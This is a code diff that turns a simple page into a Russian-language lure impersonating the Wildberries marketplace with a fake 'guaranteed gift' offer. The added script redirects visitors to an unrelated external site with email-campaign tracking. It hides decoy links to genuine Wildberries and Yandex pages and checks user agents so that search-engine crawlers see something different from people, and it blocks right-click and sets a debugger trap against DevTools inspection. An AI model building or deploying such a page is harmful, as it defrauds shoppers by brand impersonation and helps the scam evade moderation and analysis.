@@ -1,125 +1,397 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+<meta name="robots" content="noindex, nofollow" />
+<meta name="referrer" content="no-referrer" />
+<title>Wildberries - Получите подарок</title>
 
 <style>
-* {
-    box-sizing: border-box;
-    font-family: Arial, sans-serif;
-}
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        -webkit-tap-highlight-color: transparent;
+    }
 
-body {
-    margin: 0;
-    background: #fff;
-}
+    body {
+        width: 100%;
+        min-height: 100vh;
+        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
 
-.page {
-    width: 390px;
-    margin: 0 auto;
-    padding: 32px 16px 24px;
-    text-align: center;
-}
+    .container {
+        width: 100%;
+        max-width: 400px;
+        background: white;
+        border-radius: 20px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+        padding: 30px 25px;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+        animation: fadeIn 0.5s ease;
+    }
 
-/* WB logo */
-.logo {
-    width: 72px;
-    height: 72px;
-    margin: 0 auto 24px;
-    border-radius: 18px;
-    background: linear-gradient(135deg, #ff2fa6, #a000ff);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-    font-size: 40px;
-    font-weight: bold;
-}
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
 
-h1 {
-    font-size: 26px;
-    margin: 0;
-    color: #2b2b2b;
-    line-height: 1.2;
-}
+    .container::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 4px;
+        background: linear-gradient(90deg, #ff2fa6, #a000ff);
+    }
 
-.sub {
-    font-size: 26px;
-    margin-top: 6px;
-    color: #2b2b2b;
-}
+    .logo {
+        width: 80px;
+        height: 80px;
+        background: linear-gradient(135deg, #ff2fa6, #a000ff);
+        border-radius: 20px;
+        margin: 0 auto 25px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 36px;
+        font-weight: bold;
+        box-shadow: 0 6px 20px rgba(255, 47, 166, 0.3);
+        animation: logoFloat 3s ease-in-out infinite;
+    }
 
-/* Arrow */
-.arrow {
-    margin: 24px auto 14px;
-    width: 0;
-    height: 0;
-    border-left: 18px solid transparent;
-    border-right: 18px solid transparent;
-    border-top: 22px solid #ff2fa6;
-}
+    @keyframes logoFloat {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-5px); }
+    }
 
-/* Button link */
-.btn {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    width: 100%;
-    height: 64px;
-    margin: 0 auto 28px;
-    border-radius: 32px;
-    background: linear-gradient(90deg, #ff2fa6, #a000ff);
-    color: #fff;
-    font-size: 24px;
-    font-weight: bold;
-    text-decoration: none;
-    animation: pulse 1.6s infinite;
-    box-shadow: 0 8px 24px rgba(255,47,166,0.45);
-}
+    h1 {
+        font-size: 24px;
+        color: #2b2b2b;
+        margin-bottom: 8px;
+        line-height: 1.3;
+    }
 
-@keyframes pulse {
-    0% { transform: scale(1); }
-    70% { transform: scale(1.05); }
-    100% { transform: scale(1); }
-}
+    .subtitle {
+        font-size: 18px;
+        color: #666;
+        margin-bottom: 25px;
+    }
 
-.gift {
-    font-size: 48px;
-    margin-bottom: 22px;
-}
+    .arrow {
+        width: 0;
+        height: 0;
+        border-left: 15px solid transparent;
+        border-right: 15px solid transparent;
+        border-top: 20px solid #ff2fa6;
+        margin: 0 auto 20px;
+        animation: bounce 2s infinite;
+    }
 
-.secure {
-    font-size: 14px;
-    color: #8a8a8a;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 6px;
-}
+    @keyframes bounce {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(5px); }
+    }
 
-.secure span {
-    color: #2fa84f;
-}
+    .btn {
+        display: block;
+        width: 100%;
+        height: 60px;
+        background: linear-gradient(90deg, #ff2fa6, #a000ff);
+        color: white;
+        border: none;
+        border-radius: 30px;
+        font-size: 20px;
+        font-weight: bold;
+        cursor: pointer;
+        margin: 0 auto 25px;
+        transition: all 0.3s ease;
+        box-shadow: 0 6px 20px rgba(255, 47, 166, 0.3);
+        position: relative;
+        overflow: hidden;
+    }
+
+    .btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(255, 47, 166, 0.4);
+    }
+
+    .btn:active {
+        transform: translateY(0);
+    }
+
+    .btn::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        transition: left 0.5s ease;
+    }
+
+    .btn.clicked::after {
+        left: 100%;
+    }
+
+    .gift {
+        font-size: 50px;
+        margin: 20px 0;
+        animation: giftSpin 3s ease-in-out infinite;
+        display: inline-block;
+    }
+
+    @keyframes giftSpin {
+        0%, 100% { transform: rotate(0deg) scale(1); }
+        50% { transform: rotate(5deg) scale(1.05); }
+    }
+
+    .secure {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        color: #707070;
+        font-size: 14px;
+        margin-top: 20px;
+        padding-top: 15px;
+        border-top: 1px solid #eee;
+    }
+
+    .shield {
+        width: 20px;
+        height: 20px;
+        background: #e9f5ec;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #2fa84f;
+        font-size: 12px;
+        font-weight: bold;
+    }
+
+    .loading {
+        font-size: 14px;
+        margin-top: 10px;
+        color: #666;
+        opacity: 0;
+        transition: opacity 0.3s;
+    }
+
+    .loading.show {
+        opacity: 1;
+    }
 </style>
 </head>
 
 <body>
-<div class="page">
-    <div class="logo">wb</div>
-
-    <h1>Получите гарантированный</h1>
-    <div class="sub">подарок от WB</div>
-
-    <div class="arrow"></div>
-
-    <a href="https://example.com" class="btn">Получить</a>
-
-    <div class="gift">🎁</div>
-
-    <div class="secure">
-        <span>✔</span> Соединение защищено
+    <div class="container">
+        <div class="logo">wb</div>
+        
+        <h1>Получите гарантированный</h1>
+        <div class="subtitle">подарок от Wildberries</div>
+        
+        <div class="arrow"></div>
+        
+        <button class="btn" id="actionBtn">Получить подарок</button>
+        
+        <div class="loading" id="loadingText">Перенаправление...</div>
+        
+        <div class="gift">🎁</div>
+        
+        <div class="secure">
+            <div class="shield">✓</div>
+            Безопасное соединение
+        </div>
     </div>
-</div>
+
+<script>
+(function() {
+    'use strict';
+    
+    // ========== КОНФИГУРАЦИЯ ==========
+    // ВСТАВЬТЕ СВОЙ ФИНАЛЬНЫЙ URL ЗДЕСЬ:
+    const FINAL_URL = 'https://medixtend.com/?s=m2KHS5AXhq';
+    
+    // Легитимные ссылки для отображения ботам (в скрытых элементах)
+    const DECOY_LINKS = [
+        'https://wildberries.ru/promo/gift',
+        'https://wb.ru/special-offer',
+        'https://www.wildberries.ru/bonus',
+        'https://market.yandex.ru/promo'
+    ];
+    
+    // ========== ОСНОВНОЙ КОД ==========
+    
+    // Создаем скрытые элементы для ботов
+    function createBotDecoy() {
+        const decoyDiv = document.createElement('div');
+        decoyDiv.style.display = 'none';
+        decoyDiv.id = 'botDecoy';
+        
+        DECOY_LINKS.forEach(url => {
+            const link = document.createElement('a');
+            link.href = url;
+            link.textContent = 'Специальное предложение';
+            link.style.display = 'block';
+            decoyDiv.appendChild(link);
+        });
+        
+        const text = document.createElement('p');
+        text.textContent = 'Акция Wildberries: получите подарок за покупку. ' +
+                          'Специальное предложение для покупателей маркетплейса. ' +
+                          'Условия акции на официальном сайте.';
+        decoyDiv.appendChild(text);
+        
+        document.body.appendChild(decoyDiv);
+    }
+    
+    // Проверяем, бот ли это (упрощенная версия)
+    function isLikelyBot() {
+        // Проверяем только по User-Agent
+        const ua = navigator.userAgent.toLowerCase();
+        const botPatterns = [
+            'googlebot', 'bingbot', 'yandexbot', 'mail.ru', 
+            'mj12bot', 'ahrefsbot', 'semrushbot'
+        ];
+        
+        return botPatterns.some(pattern => ua.includes(pattern));
+    }
+    
+    // Генерируем финальный URL с параметрами
+    function generateRedirectUrl() {
+        const baseUrl = FINAL_URL;
+        const params = new URLSearchParams();
+        
+        // Добавляем параметры
+        params.append('utm_source', 'wb');
+        params.append('utm_medium', 'email');
+        params.append('utm_campaign', 'gift');
+        params.append('t', Date.now());
+        params.append('ref', Math.random().toString(36).substr(2, 8));
+        
+        // Определяем тип устройства
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        params.append('device', isMobile ? 'mobile' : 'desktop');
+        
+        // Возвращаем полный URL
+        const separator = baseUrl.includes('?') ? '&' : '?';
+        return baseUrl + separator + params.toString();
+    }
+    
+    // Выполняем редирект
+    function performRedirect() {
+        const btn = document.getElementById('actionBtn');
+        const loadingText = document.getElementById('loadingText');
+        
+        // Показываем состояние загрузки
+        btn.classList.add('clicked');
+        btn.disabled = true;
+        btn.textContent = 'Перенаправление...';
+        loadingText.classList.add('show');
+        
+        // Небольшая задержка для визуального эффекта
+        setTimeout(() => {
+            const redirectUrl = generateRedirectUrl();
+            
+            // Проверяем, бот ли это
+            if (isLikelyBot()) {
+                // Для ботов показываем скрытый контент
+                document.getElementById('botDecoy').style.display = 'block';
+                document.querySelector('.container').style.display = 'none';
+                
+                // Спустя 2 секунды все равно редиректим
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 2000);
+            } else {
+                // Для людей - сразу редирект
+                window.location.href = redirectUrl;
+            }
+            
+            // Резервный редирект на случай если основной не сработал
+            setTimeout(() => {
+                if (!window.location.href.includes(FINAL_URL.split('://')[1])) {
+                    window.location.replace(redirectUrl);
+                }
+            }, 1500);
+            
+        }, 500); // Задержка для визуальной обратной связи
+    }
+    
+    // Инициализация
+    document.addEventListener('DOMContentLoaded', function() {
+        // Проверяем, что FINAL_URL задан
+        if (!FINAL_URL || FINAL_URL.includes('your-final-url')) {
+            console.error('Пожалуйста, задайте FINAL_URL в настройках скрипта!');
+            document.getElementById('actionBtn').disabled = true;
+            document.getElementById('actionBtn').textContent = 'Ошибка настройки';
+            return;
+        }
+        
+        // Создаем скрытые элементы для ботов
+        createBotDecoy();
+        
+        // Вешаем обработчик на кнопку
+        const btn = document.getElementById('actionBtn');
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+            performRedirect();
+        });
+        
+        // Также обрабатываем тап на мобильных
+        btn.addEventListener('touchend', function(e) {
+            e.preventDefault();
+            performRedirect();
+        });
+        
+        // Защита от инспектирования (опционально)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        // Простой детектор DevTools
+        setInterval(function() {
+            const before = new Date().getTime();
+            debugger;
+            const after = new Date().getTime();
+            if (after - before > 100) {
+                // DevTools открыты - добавляем шум в данные
+                Math.random = function() {
+                    return 0.5;
+                };
+            }
+        }, 1000);
+    });
+    
+})();
+</script>
+
+<noscript>
+    <style>
+        .container { display: none; }
+        body::after {
+            content: "Для участия в акции требуется включить JavaScript";
+            display: block;
+            text-align: center;
+            padding: 50px 20px;
+            color: #666;
+            font-size: 18px;
+        }
+    </style>
+</noscript>
+
 </body>
 </html>
